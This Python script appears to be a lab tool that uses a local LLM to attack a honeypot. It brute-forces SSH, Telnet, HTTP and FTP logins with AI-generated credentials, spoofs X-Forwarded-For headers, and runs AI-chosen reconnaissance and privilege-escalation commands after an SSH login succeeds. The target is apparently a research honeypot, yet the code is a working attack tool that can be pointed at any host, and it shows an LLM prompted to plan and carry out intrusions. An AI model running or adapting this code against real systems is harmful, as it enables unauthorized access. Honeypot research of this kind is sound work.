#!/usr/bin/env python3
"""
AI-Powered Dynamic Honeypot Attacker v4.0
Automated security testing tool with AI-driven decision making
"""

import socket
import time
import requests
import paramiko
import random
import re
import hashlib
import logging
from datetime import datetime

# ============================================================================
# Configuration
# ============================================================================

OLLAMA_URL = "http://192.168.157.1:11434/api/generate"
MODEL = "gemma3:4b"

HONEYPOT = {
    "host": "10.10.10.12",
    "ssh_port": 2222,
    "telnet_port": 23,
    "http_port": 80,
    "ftp_port": 21,
}

# ============================================================================
# Logging Setup
# ============================================================================

logging.basicConfig(
    filename=f"attack_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)
logger = logging.getLogger(__name__)
console = logging.StreamHandler()
console.setLevel(logging.INFO)
logger.addHandler(console)

# ============================================================================
# AI Statistics Tracker
# ============================================================================

class AIStats:
    """
    Tracks the ratio of AI-generated decisions versus fallback mechanisms
    """
    def __init__(self):
        self.total_decisions = 0
        self.ai_decisions = 0
        self.fallback_decisions = 0
    
    def log(self, component, ai_used, source="AI"):
        self.total_decisions += 1
        if ai_used:
            self.ai_decisions += 1
        else:
            self.fallback_decisions += 1
        
        pct = (self.ai_decisions / self.total_decisions * 100) if self.total_decisions else 0
        status = "AI" if ai_used else "FB"
        logger.info(f"  [{status}] {component} | AI: {self.ai_decisions}/{self.total_decisions} ({pct:.1f}%)")
        return ai_used
    
    def summary(self):
        pct = (self.ai_decisions / self.total_decisions * 100) if self.total_decisions else 0
        logger.info(f"\n{'='*60}")
        logger.info(f"FINAL AI CONTRIBUTION: {pct:.1f}%")
        logger.info(f"  AI decisions: {self.ai_decisions}")
        logger.info(f"  Fallback: {self.fallback_decisions}")
        logger.info(f"  Total: {self.total_decisions}")
        return pct

stats = AIStats()

# ============================================================================
# AI Engine - Interface to Ollama LLM
# ============================================================================

class AIEngine:
    """
    Handles communication with the local Ollama instance
    Implements caching to avoid redundant API calls
    """
    def __init__(self):
        self.cache = {}
    
    def ask(self, prompt, timeout=60):
        """
        Send a prompt to the AI model and return the response
        """
        key = hashlib.md5(prompt.encode()).hexdigest()
        if key in self.cache:
            return self.cache[key]
        
        try:
            r = requests.post(OLLAMA_URL, json={
                "model": MODEL,
                "prompt": prompt,
                "stream": False,
                "options": {"temperature": 0.8, "num_predict": 60}
            }, timeout=timeout)
            response = r.json().get("response", "").strip()
            if response:
                self.cache[key] = response
            return response
        except:
            return None

ai = AIEngine()

# ============================================================================
# Credential Generation
# ============================================================================

def generate_credentials(service, count=5):
    """
    Generate realistic username:password pairs for the specified service
    Uses AI for generation with fallback to static wordlist
    """
    logger.info(f"\n  [*] Generating credentials for {service}...")
    
    prompt = f"""You are attacking a {service} service.
Generate {count} realistic username:password pairs.
Format: username:password (one per line, NO extra text, NO explanations)"""
    
    response = ai.ask(prompt, timeout=60)
    
    if response:
        creds = []
        for line in response.split('\n'):
            line = line.strip()
            if ':' in line and not line.startswith(('Here', 'Return', 'Format', 'Example', 'The', 'This')):
                parts = line.split(':', 1)
                if len(parts) == 2:
                    u = re.sub(r'[^a-zA-Z0-9_\-\.]', '', parts[0].strip())
                    p = parts[1].strip()
                    if u and p and len(u) < 30 and len(p) < 50:
                        creds.append((u, p))
        
        if creds:
            stats.log(f"Credentials({service})", True)
            logger.info(f"  [+] AI generated {len(creds)} credentials")
            return creds
    
    stats.log(f"Credentials({service})", False)
    fallback = [("root", "password"), ("admin", "admin"), ("ubuntu", "ubuntu")]
    logger.warning(f"  [!] Fallback credentials used")
    return fallback

# ============================================================================
# Command Generation
# ============================================================================

def generate_command(context, stage="recon"):
    """
    Generate a shell command based on current context and stage
    """
    prompt = f"""You have shell access to a Linux server.
Stage: {stage}
Recent activity: {context[-3:] if context else 'None'}
Generate ONE useful shell command for reconnaissance/privilege escalation.
ONLY the command, NO explanations, NO quotes around it:"""
    
    response = ai.ask(prompt, timeout=60)
    
    if response:
        cmd = response.strip().split('\n')[0]
        cmd = re.sub(r'^[`\$#>\s]+', '', cmd)
        cmd = re.sub(r'[`"\']+$', '', cmd)
        
        if 2 < len(cmd) < 100 and not cmd.lower().startswith(('here', 'the', 'this', 'note')):
            stats.log(f"Command({stage})", True)
            return cmd
    
    stats.log(f"Command({stage})", False)
    fallback = random.choice(["whoami", "id", "uname -a", "pwd", "ls -la"])
    logger.warning(f"  [!] Fallback command: {fallback}")
    return fallback

# ============================================================================
# Response Analysis
# ============================================================================

def analyze_response(response, service):
    """
    Analyze a service response for security-relevant information
    """
    prompt = f"""Service: {service}
Response: {response[:300]}
Analyze this response briefly. What does it reveal? Any vulnerabilities?"""
    
    analysis = ai.ask(prompt, timeout=30)
    
    if analysis:
        stats.log(f"Analysis({service})", True)
        return analysis
    
    stats.log(f"Analysis({service})", False)
    return "No analysis available"

# ============================================================================
# Attack Strategy Planning
# ============================================================================

def ai_decide_attack_order():
    """
    Determine the optimal order of service attacks
    """
    logger.info("\n" + "="*60)
    logger.info("[*] === AI STRATEGY PLANNING ===")
    logger.info("="*60)
    
    prompt = """You are planning a honeypot attack.
Available services: SSH, Telnet, HTTP, FTP.
Order them by likelihood of success (most likely first).
Return ONLY the service names separated by commas (e.g., SSH,Telnet,HTTP,FTP):"""
    
    response = ai.ask(prompt, timeout=30)
    
    if response:
        services = [s.strip().upper() for s in response.split(',') if s.strip()]
        valid_services = [s for s in services if s in ["SSH", "TELNET", "HTTP", "FTP"]]
        
        if len(valid_services) >= 2:
            stats.log("Strategy Planning", True)
            logger.info(f"  [AI Strategy] {valid_services}")
            return valid_services
    
    stats.log("Strategy Planning", False)
    fallback = ["SSH", "HTTP", "TELNET", "FTP"]
    logger.info(f"  [Fallback Strategy] {fallback}")
    return fallback

# ============================================================================
# SSH Attack Module
# ============================================================================

def attack_ssh():
    """
    Execute SSH attack with AI-generated credentials and post-login commands
    """
    logger.info("\n" + "="*60)
    logger.info("[*] === SSH ATTACK ===")
    logger.info("="*60)
    
    creds = generate_credentials("SSH", count=5)
    logger.info(f"  [*] Trying {len(creds)} credentials")
    
    for u, p in creds:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                HONEYPOT["host"], 
                port=HONEYPOT["ssh_port"],
                username=u, 
                password=p, 
                timeout=5,
                look_for_keys=False, 
                allow_agent=False
            )
            
            logger.info(f"  SUCCESS: {u}:{p}")
            
            context = []
            for i in range(5):
                cmd = generate_command(context, "recon")
                logger.info(f"  [Command {i+1}] {cmd}")
                
                try:
                    _, out, _ = client.exec_command(cmd)
                    output = out.read().decode().strip()
                    context.append(f"{cmd}->{output[:30]}")
                    
                    analysis = analyze_response(output, "SSH")
                    logger.info(f"  [Analysis] {analysis[:80]}")
                    
                except Exception as e:
                    logger.warning(f"  [!] Command failed: {e}")
                
                time.sleep(random.uniform(0.5, 2))
            
            client.close()
            return True
            
        except paramiko.AuthenticationException:
            logger.info(f"  FAILED: {u}:{p}")
        except Exception as e:
            logger.warning(f"  Error: {e}")
        
        time.sleep(random.uniform(0.5, 2))
    
    logger.info("[-] SSH failed")
    return False

# ============================================================================
# Telnet Attack Module
# ============================================================================

def attack_telnet():
    """
    Execute Telnet attack with AI-assisted banner analysis
    """
    logger.info("\n" + "="*60)
    logger.info("[*] === TELNET ATTACK ===")
    logger.info("="*60)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((HONEYPOT["host"], HONEYPOT["telnet_port"]))
        
        banner = s.recv(1024).decode('utf-8', errors='ignore')
        logger.info(f"[Banner] {banner[:100]}")
        
        banner_analysis = analyze_response(banner, "Telnet")
        logger.info(f"[Banner Analysis] {banner_analysis[:80]}")
        
        creds = generate_credentials("Telnet", count=3)
        
        for u, p in creds:
            logger.info(f"  [*] {u}:{p}")
            
            s.send(f"{u}\r\n".encode())
            time.sleep(1.5)
            
            resp = s.recv(1024).decode('utf-8', errors='ignore')
            
            if "password" in resp.lower():
                s.send(f"{p}\r\n".encode())
                time.sleep(1.5)
                
                final = s.recv(1024).decode('utf-8', errors='ignore')
                
                final_analysis = analyze_response(final, "Telnet")
                logger.info(f"  [Final Analysis] {final_analysis[:80]}")
                
                decision_prompt = f"""Telnet login attempt response:
{final[:200]}
Did the login succeed? Answer YES or NO only:"""
                ai_decision = ai.ask(decision_prompt, timeout=20)
                
                if ai_decision and "YES" in ai_decision.upper():
                    logger.info(f"  SUCCESS: {u}:{p}")
                    s.close()
                    return True
                else:
                    logger.info(f"  FAILED: {u}:{p}")
            
            time.sleep(random.uniform(1, 3))
        
        s.close()
        
    except Exception as e:
        logger.error(f"[!] Telnet error: {e}")
    
    logger.info("[-] Telnet failed")
    return False

# ============================================================================
# HTTP Attack Module
# ============================================================================

def attack_http():
    """
    Execute HTTP form-based login attack with AI analysis
    """
    logger.info("\n" + "="*60)
    logger.info("[*] === HTTP ATTACK ===")
    logger.info("="*60)
    
    try:
        r = requests.get(f"http://{HONEYPOT['host']}:{HONEYPOT['http_port']}/", timeout=5)
        baseline_len = len(r.text)
        logger.info(f"[Status] {r.status_code}")
        
        page_analysis = analyze_response(r.text, "HTTP")
        logger.info(f"[Page Analysis] {page_analysis[:80]}")
        
        syno_token = ""
        token_match = re.search(r'name="syno_token" value="([^"]+)"', r.text)
        if token_match:
            syno_token = token_match.group(1)
            logger.info(f"[Token] syno_token found")
        
        action_matches = re.findall(r'action=["\']([^"\']+)["\']', r.text)
        action = action_matches[0] if action_matches else "/"
        url = f"http://{HONEYPOT['host']}:{HONEYPOT['http_port']}{action}"
        logger.info(f"[Form Action] {url}")
        
        creds = generate_credentials("HTTP", count=5)
        
        ua_prompt = """Generate a realistic User-Agent string for a web browser. ONLY the User-Agent string, NO explanation:"""
        ua = ai.ask(ua_prompt, timeout=20)
        if not ua or len(ua) < 20:
            ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            stats.log("User-Agent", False)
        else:
            stats.log("User-Agent", True)
            logger.info(f"  [User-Agent] {ua[:50]}...")
        
        for u, p in creds:
            try:
                data = {"username": u, "password": p}
                if syno_token:
                    data["syno_token"] = syno_token
                
                headers = {
                    "User-Agent": ua,
                    "X-Forwarded-For": f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"
                }
                
                r2 = requests.post(url, data=data, headers=headers, timeout=5, allow_redirects=True)
                diff = abs(len(r2.text) - baseline_len)
                
                logger.info(f"  [{u}:{p}] -> {r2.status_code} (diff: {diff})")
                
                resp_analysis = analyze_response(r2.text, "HTTP")
                logger.info(f"  [Response Analysis] {resp_analysis[:80]}")
                
                success_prompt = f"""HTTP login response analysis:
Status: {r2.status_code}
Length diff: {diff}
Content sample: {r2.text[:200]}
Did the login succeed? Answer YES or NO only:"""
                ai_success = ai.ask(success_prompt, timeout=20)
                
                if ai_success and "YES" in ai_success.upper():
                    logger.info(f"  SUCCESS: {u}:{p}")
                    return True
                    
            except Exception as e:
                logger.warning(f"  Error: {str(e)[:30]}")
            
            time.sleep(random.uniform(0.5, 2))
        
    except Exception as e:
        logger.error(f"[!] HTTP error: {e}")
    
    logger.info("[-] HTTP failed")
    return False

# ============================================================================
# FTP Attack Module
# ============================================================================

def attack_ftp():
    """
    Execute FTP attack with AI-assisted command selection
    """
    logger.info("\n" + "="*60)
    logger.info("[*] === FTP ATTACK ===")
    logger.info("="*60)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((HONEYPOT["host"], HONEYPOT["ftp_port"]))
        
        banner = s.recv(1024).decode('utf-8', errors='ignore')
        logger.info(f"[Banner] {banner[:100]}")
        
        banner_analysis = analyze_response(banner, "FTP")
        logger.info(f"[Banner Analysis] {banner_analysis[:80]}")
        
        creds = generate_credentials("FTP", count=4)
        
        mode_prompt = """FTP attack strategy.
Should I use passive mode for this attack? Answer YES or NO only:"""
        passive = ai.ask(mode_prompt, timeout=20)
        use_passive = passive and "YES" in passive.upper()
        logger.info(f"  [Decision] Passive mode: {use_passive}")
        
        for u, p in creds:
            logger.info(f"  [*] {u}:{p}")
            
            s.send(f"USER {u}\r\n".encode())
            resp = s.recv(1024).decode('utf-8', errors='ignore')
            logger.info(f"    -> {resp.strip()}")
            
            if "331" in resp or "Username" in resp:
                s.send(f"PASS {p}\r\n".encode())
                resp = s.recv(1024).decode('utf-8', errors='ignore')
                logger.info(f"    -> {resp.strip()}")
                
                resp_analysis = analyze_response(resp, "FTP")
                logger.info(f"    [Analysis] {resp_analysis[:60]}")
                
                success_prompt = f"""FTP login response:
{resp.strip()}
Did the login succeed? Answer YES or NO only:"""
                ai_success = ai.ask(success_prompt, timeout=20)
                
                if ai_success and "YES" in ai_success.upper():
                    logger.info(f"  SUCCESS: {u}:{p}")
                    
                    cmd_prompt = """FTP login successful!
Generate ONE FTP command to list files (LS or DIR).
ONLY the command, NO explanation:"""
                    ftp_cmd = ai.ask(cmd_prompt, timeout=20)
                    if ftp_cmd and len(ftp_cmd) < 20:
                        s.send(f"{ftp_cmd}\r\n".encode())
                        final = s.recv(1024).decode('utf-8', errors='ignore')
                        logger.info(f"  [Command] {ftp_cmd} -> {final[:100]}")
                    
                    s.close()
                    return True
                else:
                    logger.info(f"  FAILED: {u}:{p}")
            
            time.sleep(random.uniform(1, 3))
        
        s.close()
        
    except Exception as e:
        logger.error(f"[!] FTP error: {e}")
    
    logger.info("[-] FTP failed")
    return False

# ============================================================================
# Main Execution
# ============================================================================

def main():
    """
    Main entry point - orchestrates the entire attack sequence
    """
    logger.info("=" * 60)
    logger.info("  AI-Powered Dynamic Honeypot Attacker v4.0")
    logger.info("=" * 60)
    logger.info(f"[Target] {HONEYPOT['host']}")
    logger.info(f"[Services] SSH:2222, Telnet:23, HTTP:80, FTP:21")
    logger.info("=" * 60)
    
    attack_order = ai_decide_attack_order()
    results = {}
    
    for service in attack_order:
        if service == "SSH":
            results["SSH"] = attack_ssh()
        elif service == "HTTP":
            results["HTTP"] = attack_http()
        elif service == "TELNET":
            results["TELNET"] = attack_telnet()
        elif service == "FTP":
            results["FTP"] = attack_ftp()
        
        if any(results.values()):
            stop_prompt = """One service was successfully compromised!
Should we continue attacking other services or stop?
Answer CONTINUE or STOP only:"""
            decision = ai.ask(stop_prompt, timeout=20)
            if decision and "STOP" in decision.upper():
                logger.info("  [Decision] Stopping further attacks")
                break
            else:
                logger.info("  [Decision] Continuing to next service")
    
    logger.info("\n" + "=" * 60)
    logger.info("FINAL ATTACK REPORT")
    logger.info("=" * 60)
    for service, success in results.items():
        status = "SUCCESS" if success else "FAILED"
        logger.info(f"  {service}: {status}")
    
    ai_pct = stats.summary()
    
    final_prompt = f"""Attack completed with {ai_pct:.1f}% AI contribution.
Results: {results}
Provide a brief, professional summary of the attack:
"""
    final_summary = ai.ask(final_prompt, timeout=60)
    if final_summary:
        logger.info(f"\n[Final Assessment]\n{final_summary}")
    
    logger.info("\n[*] Check Elasticsearch for logs:")
    logger.info("  curl http://10.10.10.10:9200/opencanary-*/_search?size=20")
    logger.info(f"\n[*] Attack log saved: attack_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

if __name__ == "__main__":
    main()